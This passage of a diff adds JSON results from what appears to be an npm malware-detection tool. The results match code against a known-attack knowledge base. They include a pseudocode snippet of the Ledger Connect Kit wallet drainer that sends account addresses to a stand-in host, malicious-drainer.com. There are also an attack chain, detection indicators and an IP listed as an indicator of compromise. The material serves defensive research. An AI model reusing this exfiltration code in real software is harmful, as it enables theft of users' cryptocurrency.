+                  "how_to_detect": "Monitor for npm packages with preinstall scripts that execute and then delete files, especially those that write and run batch or PowerShell scripts. Flag any install-time network requests to suspicious or hardcoded IPs such as 103.179.142.171. Detect DLL execution via rundll32 during package installation. Scan for obfuscated JavaScript in service workers or code that attempts automated wallet transactions. Correlate with known IOCs and file hashes for comprehensive detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_086176_snippet_1",
+              "source_package": "Ledger Connect Kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_086176/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4243117570877075,
+              "code_similarity": 0.37820518016815186,
+              "behavior_similarity": 0.4704183340072632,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nwindow.addEventListener('load', function() {\n  if (window.ethereum) {\n    window.ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {\n      fetch('https://malicious-drainer.com/api', {\n        method: 'POST',\n        body: JSON.stringify({ accounts: accounts, provider: 'metamask' })\n      });\n      // Additional code to initiate token transfers from user wallet\n    });\n  }\n});",
+                "code_behavior": "On page load, the code requests wallet access from the user via window.ethereum, then immediately sends the obtained wallet addresses to an attacker-controlled domain using a POST request, and subsequently initiates unauthorized token transfers from the user's wallet, resulting in theft of assets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code exfiltrates sensitive wallet information to an untrusted external server and initiates token transfers without user consent, which is a hallmark of wallet-draining malware.",
+                  "violated_expectations": "Legitimate connect-kit code should only facilitate secure wallet connections and never transmit wallet addresses or credentials to third-party domains, nor initiate transactions without explicit user action. The malicious code violates these expectations by sending sensitive data externally and automating asset transfers.",
+                  "similar_legitimate_use": "Legitimate wallet connectors may request account access from the user, but they do not transmit wallet addresses or credentials to unknown domains, nor do they automate token transfers without explicit user approval.",
+                  "key_indicators": [
+                    "Outbound POST requests to attacker-controlled domains (e.g., malicious-drainer.com)",
+                    "Automated wallet access requests followed by immediate data exfiltration",
+                    "Token transfer logic present and triggered without user interaction",
+                    "Malicious code present only in compromised package version (1.1.7)",
+                    "Obfuscated or unfamiliar code in dist/ledger-connect-kit.js"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "When the dApp loads the connect-kit in the browser (page load event)",
+                  "file_location": "dist/ledger-connect-kit.js",
+                  "required_permissions": [
+                    "network access (fetch/XHR)",
+                    "browser wallet access (window.ethereum)",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Ledger Connect Kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.7 (compromised), 1.1.8 (remediated)",
+                  "why_malicious": "The package was compromised via a supply chain attack after a Ledger developer's npm account was phished. The attacker published version 1.1.7 containing malicious JavaScript that, when loaded by dApps, exfiltrated wallet addresses and credentials to an attacker-controlled server and initiated unauthorized token transfers, resulting in theft of user cryptocurrency assets."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to Ledger developer's npm account via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Ability to publish malicious package version"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code is injected into Ledger Connect Kit and published to npm as version 1.1.7.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to downstream projects"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Downstream dApps and projects load the compromised connect-kit JavaScript from npm or CDN.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code executes in user browsers"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious JavaScript executes in the browser, requests wallet access, exfiltrates credentials, and initiates unauthorized token transfers.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Theft of user cryptocurrency assets"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript wallet connector code making outbound network requests to untrusted or previously unseen domains after requesting wallet access",
+                    "Automated wallet access requests (eth_requestAccounts) immediately followed by POST requests containing wallet addresses",
+                    "Presence of token transfer logic that executes without explicit user interaction"
+                  ],
+                  "file_indicators": [
+                    "dist/ledger-connect-kit.js containing obfuscated or unfamiliar code not present in official source",
+                    "New or modified JavaScript files in version 1.1.7 that do not match the official repository",
+                    "References to external domains (e.g., malicious-drainer.com) in package code"
+                  ],
+                  "network_indicators": [
+                    "Outbound POST requests to domains not associated with Ledger, such as malicious-drainer.com or webhook.site",
+                    "Unusual network traffic from dApp frontends to unknown endpoints immediately after wallet connection"
+                  ],
+                  "how_to_detect": "Monitor JavaScript wallet connector packages for outbound network requests to untrusted domains, especially immediately after wallet access is requested. Use static and dynamic analysis to flag code that exfiltrates wallet addresses or initiates token transfers without explicit user interaction. Compare the contents and hashes of package files between trusted and newly published versions to detect unauthorized code changes. Alert on the presence of unfamiliar or obfuscated code in dist/ledger-connect-kit.js and on any references to non-Ledger domains."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/quote-request.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@stellar-broker##client/0.6.13/package/src/quote-result.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
